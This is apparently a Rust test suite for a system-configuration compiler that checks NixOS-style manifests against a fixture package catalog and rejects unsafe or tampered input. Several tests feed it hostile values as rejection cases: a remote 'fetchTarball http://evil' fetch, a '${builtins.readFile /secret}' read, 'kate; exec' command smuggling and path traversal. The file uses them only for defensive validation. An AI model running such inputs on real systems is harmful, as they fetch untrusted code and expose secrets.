//! Catalog metadata, identities, data observations and permission grants here are
//! fixtures. Real locked-package/module evaluation is a separate guest provider.
use aios_protocol::contracts::canonical_json;
use aios_state::*;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
fn hash(v: &Value) -> String {
    format!("{:x}", Sha256::digest(canonical_json(v).unwrap()))
}
fn catalog_value(unfree: bool) -> Value {
    let mut entries = vec![];
    for (id, attribute, cap, version) in [
        (
            "blender",
            json!(["blender"]),
            "desktop_application",
            "fixture-1",
        ),
        (
            "kate",
            json!(["kdePackages", "kate"]),
            "desktop_application",
            "fixture-2",
        ),
        (
            "postgresql-17",
            json!(["postgresql_17"]),
            "postgresql17",
            "17.7",
        ),
    ] {
        let mut p = json!({"id":id,"attribute":attribute,"display_name":id,"version":version,
            "licenses":["MIT"],"unfree":unfree && id == "blender","platform":"x86_64-linux",
            "binaries":[if id == "postgresql-17" { "pg_isready" } else { id }],"desktop_ids":[],"capability":cap});
        p["metadata_revision"] = json!(hash(&p));
        entries.push(p);
    }
    let options=[
        ("power_policy.profile_on_ac","power_profile"),("power_policy.profile_on_battery","power_profile"),
        ("services.openssh.enabled","boolean"),("services.openssh.open_firewall","boolean"),
        ("services.postgresql.enabled","boolean"),("services.postgresql.listen_mode","postgresql_listen_mode"),
        ("services.postgresql.package_id","package_id")].into_iter().map(|(id,value_kind)|{
            let mut option=json!({"id":id,"value_kind":value_kind});
            option["metadata_revision"]=json!(hash(&option));option
        }).collect::<Vec<_>>();
    let content = json!({"schema_version":1,"base_template_revision":"1".repeat(64),"lock_sha256":"2".repeat(64),
        "nixpkgs_revision":"774debe7a0d1b496e35677ad955a1011c6ff74f3","installation_state_version":"26.05",
        "platform":"x86_64-linux","packages":entries,"options":options});
    json!({"catalog_revision":hash(&content),"content":content})
}
fn catalog() -> Catalog {
    Catalog::from_installed(&serde_json::to_vec(&catalog_value(false)).unwrap()).unwrap()
}
fn default_state(c: &Catalog) -> Compiled {
    c.compile(&serde_json::to_vec(&c.defaults()).unwrap())
        .unwrap()
}
fn rejected(c: &Catalog, value: Value, error: Error) {
    assert_eq!(
        c.compile(&serde_json::to_vec(&value).unwrap()).unwrap_err(),
        error
    );
}
#[test]
fn defaults_materialize_with_exact_revisions_and_canonical_bytes() {
    let c = catalog();
    let minimal = json!({"schema_version":1,"base_template_revision":c.content().base_template_revision,"catalog_revision":c.revision()});
    let compiled = c.compile(&serde_json::to_vec(&minimal).unwrap()).unwrap();
    assert_eq!(compiled.bytes, default_state(&c).bytes);
    assert_eq!(
        compiled.digest,
        hash(&serde_json::to_value(&compiled.state).unwrap())
    );
    assert!(
        compiled.state.services.openssh.enabled && compiled.state.services.openssh.open_firewall
    );
    assert!(!compiled.state.services.postgresql.enabled);
    assert_eq!(
        compiled.state.services.postgresql.listen_mode,
        ListenMode::UnixOnly
    );
    assert_eq!(
        compiled.state.power_policy.profile_on_battery,
        PowerProfile::PowerSaver
    );
}
#[test]
fn arbitrary_nix_options_imports_and_authority_are_rejected() {
    let c = catalog();
    for key in [
        "imports",
        "overlays",
        "nix",
        "options",
        "fetchers",
        "system.stateVersion",
        "users",
        "authorized_key",
        "command",
        "approval",
        "allowUnfree",
        "user_runtime",
    ] {
        let mut v = serde_json::to_value(c.defaults()).unwrap();
        v[key] = json!("builtins.fetchTarball http://evil");
        rejected(&c, v, Error::InvalidInput);
    }
    for (domain, key) in [("postgresql", "dataDir"), ("openssh", "authorizedKeys")] {
        let mut v = serde_json::to_value(c.defaults()).unwrap();
        v["services"][domain][key] = json!("arbitrary");
        rejected(&c, v, Error::InvalidInput);
    }
}
#[test]
fn duplicate_keys_types_versions_and_limits_fail_closed() {
    let c = catalog();
    let original = serde_json::to_string(&c.defaults()).unwrap();
    let duplicate = format!("{{\"schema_version\":1,{}", &original[1..]);
    assert_eq!(
        c.compile(duplicate.as_bytes()).unwrap_err(),
        Error::InvalidInput
    );
    let nested = original.replace("\"enabled\":false", "\"enabled\":false,\"enabled\":true");
    assert_eq!(
        c.compile(nested.as_bytes()).unwrap_err(),
        Error::InvalidInput
    );
    for value in [json!(true), json!(1.0), json!(2), json!(null)] {
        let mut v = serde_json::to_value(c.defaults()).unwrap();
        v["schema_version"] = value;
        rejected(&c, v, Error::InvalidInput);
    }
    assert_eq!(
        c.compile(&vec![b' '; MAX_MANIFEST_BYTES + 1]).unwrap_err(),
        Error::InvalidInput
    );
    assert_eq!(c.compile(b"").unwrap_err(), Error::InvalidInput);
    assert_eq!(
        c.compile(format!("{original} trailing").as_bytes())
            .unwrap_err(),
        Error::InvalidInput
    );
}
#[test]
fn catalog_ids_only_no_attribute_or_expression_selection() {
    let c = catalog();
    for name in [
        "pkgs.kdePackages.kate",
        "/nix/store/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-evil",
        "kate; exec",
        "../../kate",
        "${builtins.readFile /secret}",
        "unreviewed",
    ] {
        let mut v = serde_json::to_value(c.defaults()).unwrap();
        v["system_packages"] = json!([name]);
        rejected(&c, v, Error::UnknownPackage);
    }
    let mut v = serde_json::to_value(c.defaults()).unwrap();
    v["system_packages"] = json!(["postgresql-17"]);
    rejected(&c, v, Error::WrongCapability);
    let mut v = serde_json::to_value(c.defaults()).unwrap();
    v["services"]["postgresql"]["package_id"] = json!("kate");
    rejected(&c, v, Error::WrongCapability);
}
#[test]
fn stale_template_or_catalog_revisions_are_not_rewritten() {
    let c = catalog();
    for key in ["base_template_revision", "catalog_revision"] {
        let mut v = serde_json::to_value(c.defaults()).unwrap();
        v[key] = json!("0".repeat(64));
        rejected(&c, v, Error::RevisionChanged);
    }
}
#[test]
fn packages_normalize_order_but_never_duplicate() {
    let c = catalog();
    let mut a = c.defaults();
    a.system_packages = vec!["kate".into(), "blender".into()];
    let first = c.compile(&serde_json::to_vec(&a).unwrap()).unwrap();
    a.system_packages.reverse();
    assert_eq!(
        first.bytes,
        c.compile(&serde_json::to_vec(&a).unwrap()).unwrap().bytes
    );
    a.system_packages.push("kate".into());
    rejected(&c, serde_json::to_value(a).unwrap(), Error::InvalidInput);
}
#[test]
fn ssh_management_path_cannot_be_disabled_or_hidden() {
    let c = catalog();
    for field in ["enabled", "open_firewall"] {
        let mut v = serde_json::to_value(c.defaults()).unwrap();
        v["services"]["openssh"][field] = json!(false);
        rejected(&c, v, Error::ProtectedTransport);
    }
    let baseline = default_state(&c);
    assert_eq!(
        c.prepare(
            &baseline,
            Intent::SetOpenssh {
                enabled: false,
                open_firewall: true
            },
            DatabaseData::Absent,
            &PreparationGrants::default()
        )
        .unwrap_err(),
        Error::ProtectedTransport
    );
}
#[test]
fn no_postgres_public_listener_or_arbitrary_power_profile() {
    let c = catalog();
    let mut v = serde_json::to_value(c.defaults()).unwrap();
    v["services"]["postgresql"]["listen_mode"] = json!("tcp");
    rejected(&c, v, Error::InvalidInput);
    let mut v = serde_json::to_value(c.defaults()).unwrap();
    v["power_policy"]["profile_on_ac"] = json!("run-command");
    rejected(&c, v, Error::InvalidInput);
}
#[test]
fn catalog_tampering_duplicates_and_incomplete_metadata_are_rejected() {
    let v = catalog_value(false);
    let mut stale = v.clone();
    stale["content"]["packages"][0]["version"] = json!("new");
    assert_eq!(
        Catalog::from_installed(&serde_json::to_vec(&stale).unwrap()).unwrap_err(),
        Error::CatalogInvalid
    );
    for field in [
        "version",
        "licenses",
        "platform",
        "metadata_revision",
        "attribute",
    ] {
        let mut bad = v.clone();
        bad["content"]["packages"][0]
            .as_object_mut()
            .unwrap()
            .remove(field);
        bad["catalog_revision"] = json!(hash(&bad["content"]));
        assert_eq!(
            Catalog::from_installed(&serde_json::to_vec(&bad).unwrap()).unwrap_err(),
            Error::CatalogInvalid
        );
    }
    for case in ["missing-option","wrong-option-kind","stale-option-metadata"] {
        let mut bad=v.clone();
        match case {
            "missing-option"=>{bad["content"]["options"].as_array_mut().unwrap().pop();},
            "wrong-option-kind"=>{
                bad["content"]["options"][0]["value_kind"]=json!("boolean");
                let mut metadata=bad["content"]["options"][0].clone();
                metadata.as_object_mut().unwrap().remove("metadata_revision");
                bad["content"]["options"][0]["metadata_revision"]=json!(hash(&metadata));
            },
            _=>bad["content"]["options"][0]["metadata_revision"]=json!("0".repeat(64)),
        }
        bad["catalog_revision"]=json!(hash(&bad["content"]));
        assert_eq!(Catalog::from_installed(&serde_json::to_vec(&bad).unwrap()).unwrap_err(),Error::CatalogInvalid,"{case}");
    }
    let s = serde_json::to_string(&v).unwrap();
    let duplicate = format!(
        "{{\"catalog_revision\":{},{}",
        v["catalog_revision"],
        &s[1..]
    );
    assert_eq!(
        Catalog::from_installed(duplicate.as_bytes()).unwrap_err(),
        Error::CatalogInvalid
    );
}
#[test]
fn install_remove_preview_preserves_data_and_unknown_costs() {
    let c = catalog();
    let baseline = default_state(&c);
    let add = c
        .prepare(
            &baseline,
            Intent::InstallPackage {
                package_id: "kate".into(),
            },
            DatabaseData::Unknown,
            &PreparationGrants::default(),
        )
        .unwrap();
    assert_eq!(add.added_packages, ["kate"]);
    assert_eq!(add.risk, Risk::R2);
    assert_eq!(
        add.validators,
        [Validator::DesktopCapability {
            package_id: "kate".into(),
            binaries: vec!["kate".into()],
            desktop_ids: vec![]
        }]
    );
    assert!(!add.final_authorization_ready);
    assert_eq!(
        add.recovery,
        Recovery::ReversibleConfigurationDataMayRemain
    );
    assert!(
        add.candidate_closure.is_none()
            && add.build_bytes.is_none()
            && add.download_bytes.is_none()
            && add.reboot_required.is_none()
    );
    let installed = c
        .compile(&serde_json::to_vec(&add.candidate_manifest).unwrap())
        .unwrap();
    let remove = c
        .prepare(
            &installed,
            Intent::RemovePackage {
                package_id: "kate".into(),
            },
            DatabaseData::Unknown,
            &PreparationGrants::default(),
        )
        .unwrap();
    assert_eq!(remove.removed_packages, ["kate"]);
    assert!(!remove.user_data_deleted);
    assert!(remove.retained_dependency_paths.is_none());
}
#[test]
fn repeated_intent_is_idempotent_and_noop_is_not_write_success() {
    let c = catalog();
    let baseline = default_state(&c);
    let noop = c
        .prepare(
            &baseline,
            Intent::RemovePackage {
                package_id: "kate".into(),
            },
            DatabaseData::Unknown,
            &PreparationGrants::default(),
        )
        .unwrap();
    assert_eq!(noop.risk, Risk::R0);
    assert!(noop.changes.is_empty() && noop.validators.is_empty());
    assert_eq!(
        noop.baseline_manifest_sha256,
        noop.candidate_manifest_sha256
    );
    assert!(!noop.final_authorization_ready);
}
#[test]
fn postgres_initialization_requires_observed_absent_data() {
    let c = catalog();
    let baseline = default_state(&c);
    for data in [DatabaseData::Unknown, DatabaseData::Present] {
        assert_eq!(
            c.prepare(
                &baseline,
                Intent::SetPostgresql {
                    enabled: true,
                    package_id: "postgresql-17".into()
                },
                data,
                &PreparationGrants::default()
            )
            .unwrap_err(),
            Error::DataReviewRequired
        );
    }
    let preview = c
        .prepare(
            &baseline,
            Intent::SetPostgresql {
                enabled: true,
                package_id: "postgresql-17".into(),
            },
            DatabaseData::Absent,
            &PreparationGrants::default(),
        )
        .unwrap();
    assert_eq!(preview.validators, [Validator::PostgresqlUnixReadiness]);
    assert!(preview.database_data_may_remain);
    assert_eq!(
        preview.recovery,
        Recovery::ReversibleConfigurationDataMayRemain
    );
    let enabled = c
        .compile(&serde_json::to_vec(&preview.candidate_manifest).unwrap())
        .unwrap();
    let stop = c
        .prepare(
            &enabled,
            Intent::SetPostgresql {
                enabled: false,
                package_id: "postgresql-17".into(),
            },
            DatabaseData::Present,
            &PreparationGrants::default(),
        )
        .unwrap();
    assert_eq!(stop.validators, [Validator::PostgresqlStopped]);
    assert!(stop.database_data_may_remain && !stop.user_data_deleted);
}
#[test]
fn narrow_unfree_acknowledgement_cannot_be_invented_by_model() {
    let c = Catalog::from_installed(&serde_json::to_vec(&catalog_value(true)).unwrap()).unwrap();
    let baseline = default_state(&c);
    let intent = || Intent::InstallPackage {
        package_id: "blender".into(),
    };
    assert_eq!(
        c.prepare(
            &baseline,
            intent(),
            DatabaseData::Unknown,
            &PreparationGrants::default()
        )
        .unwrap_err(),
        Error::UnfreeAcknowledgementRequired
    );
    let mut grants = PreparationGrants::default();
    grants.acknowledged_unfree_ids.insert("kate".into());
    assert_eq!(
        c.prepare(&baseline, intent(), DatabaseData::Unknown, &grants)
            .unwrap_err(),
        Error::UnfreeAcknowledgementRequired
    );
    grants.acknowledged_unfree_ids.insert("blender".into());
    assert!(
        c.prepare(&baseline, intent(), DatabaseData::Unknown, &grants)
            .is_ok()
    );
    assert!(
        serde_json::from_value::<Intent>(
            json!({"action":"install_package","package_id":"blender","approved":true})
        )
        .is_err()
    );
}
#[test]
fn forged_compiled_baseline_is_rejected_and_power_needs_verification() {
    let c = catalog();
    let mut baseline = default_state(&c);
    baseline.digest = "0".repeat(64);
    let intent = || Intent::SetPowerPolicy {
        profile_on_ac: PowerProfile::Performance,
        profile_on_battery: PowerProfile::PowerSaver,
    };
    assert_eq!(
        c.prepare(
            &baseline,
            intent(),
            DatabaseData::Unknown,
            &PreparationGrants::default()
        )
        .unwrap_err(),
        Error::InvalidInput
    );
    let preview = c
        .prepare(
            &default_state(&c),
            intent(),
            DatabaseData::Unknown,
            &PreparationGrants::default(),
        )
        .unwrap();
    assert_eq!(
        preview.validators,
        [Validator::PowerProfileSupportedAndApplied]
    );
    assert!(!preview.final_authorization_ready);
}
#[test]
fn offline_preview_has_no_serialized_data_or_authorization_route() {
    let c = catalog();
    let request =
        json!({"managed":c.defaults(),"intent":{"action":"install_package","package_id":"kate"}});
    assert_eq!(
        c.preview_request(&serde_json::to_vec(&request).unwrap())
            .unwrap()
            .added_packages,
        ["kate"]
    );
    for field in [
        "grants",
        "observed_data",
        "approved",
        "uid",
        "authorization_receipt",
    ] {
        let mut bad = request.clone();
        bad[field] = json!(true);
        assert_eq!(
            c.preview_request(&serde_json::to_vec(&bad).unwrap())
                .unwrap_err(),
            Error::InvalidInput
        );
    }
    let duplicate = serde_json::to_string(&request).unwrap().replace(
        "\"package_id\":\"kate\"",
        "\"package_id\":\"kate\",\"package_id\":\"blender\"",
    );
    assert_eq!(
        c.preview_request(duplicate.as_bytes()).unwrap_err(),
        Error::InvalidInput
    );
    let mut pg = request.clone();
    pg["intent"] = json!({"action":"set_postgresql","enabled":true,"package_id":"postgresql-17"});
    assert_eq!(
        c.preview_request(&serde_json::to_vec(&pg).unwrap())
            .unwrap_err(),
        Error::DataReviewRequired
    );
    assert_eq!(
        c.preview_request(&vec![b' '; MAX_MANIFEST_BYTES + 1])
            .unwrap_err(),
        Error::InvalidInput
    );
}
#[test]
fn internally_consistent_catalog_still_requires_verifiable_capabilities() {
    for case in [
        "missing-postgres",
        "missing-readiness",
        "empty-desktop-capability",
    ] {
        let mut value = catalog_value(false);
        if case == "missing-postgres" {
            value["content"]["packages"].as_array_mut().unwrap().pop();
        } else {
            let index = if case == "missing-readiness" { 2 } else { 0 };
            let package = &mut value["content"]["packages"][index];
            package["binaries"] = json!([]);
            package.as_object_mut().unwrap().remove("metadata_revision");
            package["metadata_revision"] = json!(hash(package));
        }
        value["catalog_revision"] = json!(hash(&value["content"]));
        assert_eq!(
            Catalog::from_installed(&serde_json::to_vec(&value).unwrap()).unwrap_err(),
            Error::CatalogInvalid,
            "{case}"
        );
    }
}
#[test]
fn service_packages_need_their_own_narrow_unfree_acknowledgement() {
    let mut value = catalog_value(false);
    let pg = &mut value["content"]["packages"][2];
    pg["unfree"] = json!(true);
    pg.as_object_mut().unwrap().remove("metadata_revision");
    pg["metadata_revision"] = json!(hash(pg));
    value["catalog_revision"] = json!(hash(&value["content"]));
    let c = Catalog::from_installed(&serde_json::to_vec(&value).unwrap()).unwrap();
    let baseline = default_state(&c);
    let intent = || Intent::SetPostgresql {
        enabled: true,
        package_id: "postgresql-17".into(),
    };
    let mut grants = PreparationGrants::default();
    grants.acknowledged_unfree_ids.insert("blender".into());
    assert_eq!(
        c.prepare(&baseline, intent(), DatabaseData::Absent, &grants)
            .unwrap_err(),
        Error::UnfreeAcknowledgementRequired
    );
    grants
        .acknowledged_unfree_ids
        .insert("postgresql-17".into());
    assert!(
        c.prepare(&baseline, intent(), DatabaseData::Absent, &grants)
            .is_ok()
    );
}
